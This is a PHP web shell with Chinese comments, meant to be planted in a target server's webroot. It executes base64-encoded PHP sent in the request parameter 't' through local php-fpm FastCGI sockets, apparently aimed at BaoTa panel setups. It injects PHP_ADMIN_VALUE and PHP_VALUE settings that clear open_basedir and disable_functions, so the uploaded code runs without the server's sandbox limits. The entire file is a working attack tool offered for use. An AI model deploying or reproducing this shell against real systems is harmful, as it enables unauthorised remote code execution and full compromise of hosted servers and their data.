<?php
// fcgi_run.php — 部署到目标 webroot，POST t=<base64 php code> 即可以 open_basedir=/ 执行任意 PHP。
// 原理：/tmp/example.com 通常是宝塔 php-fpm 池的监听 socket；经 FastCGI 的 PHP_ADMIN_VALUE/
//       PHP_VALUE 注入可覆盖池级 open_basedir 与 disable_functions（php-fpm 允许 per-request 覆盖）。
@set_time_limit(0);

function fcgi_nv($n, $v) {
    $r = "";
    if (strlen($n) < 128) { $r .= chr(strlen($n)); }
    else { $r .= chr((strlen($n) >> 24) & 0xFF) . chr((strlen($n) >> 16) & 0xFF) . chr((strlen($n) >> 8) & 0xFF) . chr(strlen($n) & 0xFF); }
    if (strlen($v) < 128) { $r .= chr(strlen($v)); }
    else { $r .= chr((strlen($v) >> 24) & 0xFF) . chr((strlen($v) >> 16) & 0xFF) . chr((strlen($v) >> 8) & 0xFF) . chr(strlen($v) & 0xFF); }
    return $r . $n . $v;
}
function fcgi_h($t, $c) {
    $len = strlen($c);
    $pad = (8 - ($len % 8)) % 8;
    return chr(1) . chr($t) . chr(0) . chr(1) . chr(($len >> 8) & 0xFF) . chr($len & 0xFF)
         . chr($pad) . chr(0) . $c . str_repeat(chr(0), $pad);
}
function run_fcgi($SOCK, $SCRIPT, $ADMIN, $STDIN = '') {
    $P = array(
        "GATEWAY_INTERFACE" => "FastCGI/1.0",
        "REQUEST_METHOD"    => "GET",
        "SCRIPT_FILENAME"   => $SCRIPT,
        "SCRIPT_NAME"       => "/x.php",
        "QUERY_STRING"      => "",
        "REQUEST_URI"       => "/x.php",
        "DOCUMENT_ROOT"     => "/tmp",
        "SERVER_PROTOCOL"   => "HTTP/1.0",
        "REMOTE_ADDR"       => "127.0.0.1",
        "REMOTE_PORT"       => "44444",
        "SERVER_ADDR"       => "127.0.0.1",
        "SERVER_PORT"       => "80",
        "SERVER_NAME"       => "localhost",
        "SERVER_SOFTWARE"   => "nginx",
        "CONTENT_LENGTH"    => strlen($STDIN),
        "PHP_ADMIN_VALUE"   => $ADMIN,   // ★ 关键：清掉 open_basedir / disable_functions
        "PHP_VALUE"         => $ADMIN,
    );
    $e1 = 0; $e2 = "";
    $s = @stream_socket_client("unix://" . $SOCK, $e1, $e2, 5);
    if (!$s) { echo "SOCK_FAIL " . $SOCK . " " . $e2 . "\n"; return false; }
    stream_set_timeout($s, 60);
    @fwrite($s, fcgi_h(1, chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0))); // BEGIN_REQUEST responder
    $blob = "";
    foreach ($P as $k => $v) { $blob .= fcgi_nv($k, $v); }
    @fwrite($s, fcgi_h(4, $blob));  // PARAMS
    @fwrite($s, fcgi_h(4, ""));
    @fwrite($s, fcgi_h(5, $STDIN)); // STDIN
    @fwrite($s, fcgi_h(5, ""));
    $out = "";
    while (!feof($s)) {
        $h = @fread($s, 8);
        if (strlen($h) < 8) { break; }
        $t = ord($h[1]);
        $len = (ord($h[4]) << 8) + ord($h[5]);
        $pad = ord($h[6]);
        $c = ""; $need = $len;
        while ($need > 0) { $b = @fread($s, $need); if ($b === false || $b === "") { break; } $c .= $b; $need -= strlen($b); }
        if ($pad > 0) { @fread($s, $pad); }
        if ($t == 6) { $out .= $c; }
        if ($t == 3) { break; }
    }
    @fclose($s);
    echo $out;
    return true;
}

$b64 = isset($_REQUEST['t']) ? $_REQUEST['t'] : '';
if ($b64 === '') { echo "RDY_FCGI"; return; }
$code = base64_decode($b64);
@file_put_contents('/tmp/fcgi_in.php', "<?php\n" . $code);
@clearstatcache();
foreach (array('/tmp/php-cgi-74.sock', '/tmp/example.com', '/tmp/example.com', '/tmp/php-cgi-73.sock') as $sk) {
    if (@file_exists($sk)) { echo "\n--- " . $sk . " ---\n"; run_fcgi($sk, '/tmp/fcgi_in.php', "open_basedir=/\ndisable_functions=", ''); }
}
